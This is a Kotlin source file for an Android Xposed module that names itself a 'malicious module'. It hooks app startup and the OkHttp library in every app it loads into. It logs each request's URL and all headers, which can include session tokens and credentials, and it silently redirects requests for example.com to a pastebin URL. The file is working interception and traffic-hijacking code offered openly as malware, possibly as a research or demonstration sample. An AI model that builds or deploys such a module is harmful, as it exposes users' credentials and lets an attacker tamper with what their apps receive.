@file:JvmName("XposedModule") // Prevent kotlin from renaming the file
package com.virtualxposed.maliciousmodule

import android.app.Activity
import android.app.Application
import android.content.Context
import android.content.ContextWrapper
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import de.robv.android.xposed.IXposedHookLoadPackage
import de.robv.android.xposed.XC_MethodHook
import de.robv.android.xposed.XposedBridge
import de.robv.android.xposed.XposedHelpers
import de.robv.android.xposed.callbacks.XC_LoadPackage

class XposedModule : IXposedHookLoadPackage {
    companion object {
        private const val TAG = "NetworkHook"

        private fun log(message: String) {
            XposedBridge.log("$TAG: $message")
        }

        private fun Context.getActivity(): Activity? {
            return when (this) {
                is Activity -> this
                is ContextWrapper -> this.baseContext.getActivity()
                else -> null
            }
        }

        private fun toast(context: Context, message: String) {
//            Handler(Looper.getMainLooper()).post {
//                Toast.makeText(context, "$TAG: $message", Toast.LENGTH_LONG).show()
//            }
        }
    }

    override fun handleLoadPackage(params: XC_LoadPackage.LoadPackageParam?) {
        log("Loaded malicious module version ${BuildConfig.VERSION_NAME} to package: ${params?.packageName}")

        if (params == null) return

        XposedHelpers.findAndHookMethod(
            Application::class.java,
            "attach",
            Context::class.java,
            object : XC_MethodHook() {
                override fun beforeHookedMethod(param: MethodHookParam) {
                    val context = param.args[0] as? Context
                    XposedBridge.log("Exfiltrated context from attach: $context")
                    if (context == null) return
                }

                override fun afterHookedMethod(param: MethodHookParam?) {
                    val context = param?.args[0] as? Context ?: return
                    hookOkHttp(context, params)
                    super.afterHookedMethod(param)
                }
            }
        )
    }

    fun hookOkHttp(context: Context, params: XC_LoadPackage.LoadPackageParam) {
        logOkhttp(context, params)
        redirectOkhttp(context, params)
    }

    private fun redirectOkhttp(
        context: Context,
        params: XC_LoadPackage.LoadPackageParam
    ) {
        try {
            XposedHelpers.findAndHookMethod(
                "okhttp3.OkHttpClient",
                params.classLoader,
                "newCall",
                "okhttp3.Request",
                object : XC_MethodHook() {
                    @Throws(Throwable::class)
                    override fun beforeHookedMethod(param: MethodHookParam) {
                        val originalRequest = param.args[0] ?: return

                        val oldUrl = "https://example.com"
                        val newUrl = "https://pastebin.com/raw/NCcdHd53"

                        val originalUrlObj = XposedHelpers.callMethod(originalRequest, "url")
                        val originalUrl = originalUrlObj.toString()

                        if (originalUrl.contains(oldUrl)) {
                            val builder = XposedHelpers.callMethod(originalRequest, "newBuilder")
                            XposedHelpers.callMethod(builder, "url", newUrl)
                            val newRequest = XposedHelpers.callMethod(builder, "build")

                            param.args[0] = newRequest
                            log("Successfully rewrote URL from $originalUrl to $newUrl")
                        }
                    }
                }
            )
        } catch (e: Throwable) {
            log("Failed to redirect OkHttp in ${params.packageName}: ${e.message}")
        }
    }

    private fun logOkhttp(
        context: Context,
        lpparam: XC_LoadPackage.LoadPackageParam
    ) {
        try {
            val realCall = XposedHelpers.findClass(
                "okhttp3.internal.connection.RealCall",
                lpparam.classLoader
            )

            hookOkHttpExecute(context, realCall)

        } catch (t: Throwable) {
            log("OkHttp not found in ${lpparam.packageName}: $t")
        }
    }

    private fun hookOkHttpExecute(
        context: Context,
        realCall: Class<*>
    ) {
        XposedHelpers.findAndHookMethod(
            realCall,
            "execute",
            object : XC_MethodHook() {
                override fun beforeHookedMethod(
                    param: MethodHookParam
                ) {
                    logOkHttpRequest(context, param.thisObject)
                }

                override fun afterHookedMethod(
                    param: MethodHookParam
                ) {
                    if (param.hasThrowable()) {
                        log(
                            "OkHttp execute ERROR: " +
                                    param.throwable
                        )
                        return
                    }

                    val response = param.result

                    if (response != null) {
                        logOkHttpResponse(response)
                    }
                }
            }
        )
    }


    private fun logOkHttpRequest(
        context: Context,
        call: Any
    ) {
        try {
            val request =
                XposedHelpers.callMethod(call, "request")

            val method =
                XposedHelpers.callMethod(
                    request,
                    "method"
                ) as String

            val url =
                XposedHelpers.callMethod(
                    request,
                    "url"
                ).toString()

            toast(context, "Intercepted request to $url")

            log(
                "OkHttp REQUEST " +
                        "$method $url"
            )

            logOkHttpHeaders(request)

        } catch (t: Throwable) {
            log("Unable to read OkHttp request: $t")
        }
    }

    private fun logOkHttpHeaders(
        request: Any
    ) {
        try {
            val headers =
                XposedHelpers.callMethod(
                    request,
                    "headers"
                )

            val size =
                XposedHelpers.callMethod(
                    headers,
                    "size"
                ) as Int

            for (i in 0 until size) {
                val name =
                    XposedHelpers.callMethod(
                        headers,
                        "name",
                        i
                    )

                val value =
                    XposedHelpers.callMethod(
                        headers,
                        "value",
                        i
                    )

                log(
                    "OkHttp HEADER: " +
                            "$name: $value"
                )
            }

        } catch (t: Throwable) {
            log("Unable to read OkHttp headers: $t")
        }
    }

    private fun logOkHttpResponse(
        response: Any
    ) {
        try {
            val code =
                XposedHelpers.callMethod(
                    response,
                    "code"
                )

            val request =
                XposedHelpers.callMethod(
                    response,
                    "request"
                )

            val url =
                XposedHelpers.callMethod(
                    request,
                    "url"
                )

            log(
                "OkHttp RESPONSE " +
                        "$code $url"
            )

        } catch (t: Throwable) {
            log("Unable to read OkHttp response: $t")
        }
    }

}